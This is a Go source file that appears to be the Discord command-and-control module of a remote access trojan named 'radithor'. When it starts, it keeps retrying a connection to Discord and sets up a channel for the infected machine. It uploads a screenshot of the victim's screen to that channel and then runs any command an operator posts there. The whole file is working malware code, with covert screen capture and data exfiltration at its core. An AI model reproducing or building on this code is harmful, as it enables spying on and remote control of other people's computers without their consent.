package bot

import (
	"fmt"
	"os"
	"strings"
	"time"

	"radithor/bot/discord"
	"radithor/core"
	"radithor/funcs"
	"radithor/store"
	"radithor/utils/discord_utils"

	"shared/config"

	"github.com/bwmarrin/discordgo"
)

var cmdPrefix = ""

var targetChannel string

var serverId string

var (
	lastContext   *discord.CommandContext
	lastCommand   string
	lastArguments []string
)

func StartBot() {
	core.LogInfo("[StartBot] reached!")

	token := config.GetConfigString(store.BOT_TOKEN)
	bot, _ := discordgo.New("Bot " + token)

	// todo
	// bot.UserAgent = ""
	// bot.Identify.Properties.Browser = ""

	bot.AddHandler(onMessage)

	for try := 0; ; try++ {
		err := bot.Open()
		if err == nil {
			break
		}

		toWait := 30 * time.Second

		switch {
		case try < 25:
			toWait = 2 * time.Minute
		case try < 55:
			toWait = 35 * time.Minute
		case try < 130:
			toWait = 2 * time.Hour
		}

		time.Sleep(toWait)
	}

	core.LogInfo("[StartBot] connected!")

	var err error

	serverId = config.GetConfigString(store.SERVER_ID)

	// todo, make it so if cannot setup allow manual setting up

	categoryId := config.GetConfigString(store.CATEGORY_ID)
	if categoryId == "" {
		categoryId, err = discord_utils.FindOrCreateFallbackCategory(bot, serverId)
		if err != nil {
			core.LogError("failed to find or create fallback category - %v", err)
			os.Exit(1)
		}
	}

	channelId, isNew, err := discord_utils.FindOrCreateChannel(bot, categoryId, serverId)
	if err != nil {
		core.LogError("failed to find or create channel - %v", err)
		os.Exit(1)
	}

	targetChannel = channelId

	cmdPrefix = config.GetConfigString(store.COMMAND_PREFIX)
	RegisterCommands()

	message := discord_utils.GetConnectionMsg(isNew)

	pic, err := funcs.CaptureScreen(0)
	if err != nil {
		bot.ChannelMessageSend(channelId, message)
		return
	}

	bot.ChannelMessageSendComplex(channelId, &discordgo.MessageSend{
		Content: message,
		Files: []*discordgo.File{{
			Name:   "ss.jpg",
			Reader: pic,
		}},
	})

	core.LogInfo("[StartBot] bot started!")
	select {}
}

func onMessage(ses *discordgo.Session, msg *discordgo.MessageCreate) {
	context := &discord.CommandContext{
		Session:     ses,
		Message:     msg,
		ChannelID:   msg.ChannelID,
		Content:     msg.Content,
		Attachments: msg.Attachments,
		Author:      msg.Author,
	}

	if msg.Author.ID == ses.State.User.ID {
		return
	}

	if !strings.HasPrefix(msg.Content, cmdPrefix) {
		return
	}

	parts := strings.Fields(msg.Content[len(cmdPrefix):])
	if len(parts) == 0 {
		return
	}

	name := strings.ToLower(parts[0])
	args := parts[1:]

	if name == "list" {
		link := fmt.Sprintf(
			"https://discord.com/channels/%s/%s",
			serverId,
			targetChannel,
		)

		ses.ChannelMessageSendReply(msg.ChannelID, link, msg.Reference())
		return
	}

	if msg.ChannelID != targetChannel {
		return
	}

	if name == "help" {
		if len(args) == 1 {
			command, found := commandsList[args[0]]
			if !found {
				context.ReplyMsg(fmt.Sprintf("Command `%s` does not exist.", args[0]))
				return
			}

			var helpMsg strings.Builder

			fmt.Fprintf(&helpMsg, "**%s:** %s\n", command.Name(), command.Info())

			flagCommand, hasFlags := command.(FlagCommand)
			if hasFlags {
				helpMsg.WriteString("**Flags:**\n```\n")

				flags := flagCommand.GetFlags()
				for _, flag := range flags {
					helpMsg.WriteString(flag.Name)
					helpMsg.WriteString(" - ")
					helpMsg.WriteString(flag.Info)
					helpMsg.WriteString("\n")
				}

				helpMsg.WriteString("```\n")
			}

			context.ReplyMsg(helpMsg.String())
		} else {
			var helpMsg strings.Builder

			helpMsg.WriteString("**Commands:**\n```\n")

			for _, command := range commandsList {
				helpMsg.WriteString(command.Name())
				helpMsg.WriteString(" - ")
				helpMsg.WriteString(command.Info())
				helpMsg.WriteString("\n")
			}

			fmt.Fprintf(&helpMsg, "```\nPrefix: `%s`", cmdPrefix)

			context.ReplyMsg(helpMsg.String())
		}

		return
	}

	if name == cmdPrefix && lastCommand != "" {
		go func() {
			defer func() {
				err := recover()
				if err == nil {
					return
				}

				context.ReplyMsg(fmt.Sprintf("FATAL ERROR - %v", err))
			}()

			commandsList[lastCommand].Exec(lastContext, lastArguments)
		}()
	}

	command, found := commandsList[name]
	if !found {
		context.ReplyMsg(fmt.Sprintf("Command `%s` does not exist.", name))
		return
	}

	lastContext = context
	lastCommand = name
	lastArguments = args

	go func() {
		defer func() {
			err := recover()
			if err == nil {
				return
			}

			context.ReplyMsg(fmt.Sprintf("FATAL ERROR - %v", err))
		}()

		command.Exec(context, args)
	}()
}
